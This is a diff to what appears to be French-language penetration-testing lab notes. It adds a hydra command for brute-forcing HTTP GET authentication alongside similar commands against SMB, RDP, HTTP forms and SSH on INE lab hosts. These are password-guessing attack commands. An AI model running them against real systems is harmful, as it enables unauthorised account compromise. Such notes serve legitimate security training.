@@ -10,6 +10,7 @@
 * `hydra -L users.txt -P passwords.txt smb://target1.ine.local`
 * `hydra -L users.txt -P passwords.txt rdp://target1.ine.local`
 * `hydra -L users.txt -P passwords.txt target1.ine.local http-post-form \`  
+* `hydra -L users.txt -P passwords.txt target1.ine.local http-get /`
 * `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t 4 demo.ine.local ssh`  
 
 -l = un seul nom d’utilisateur
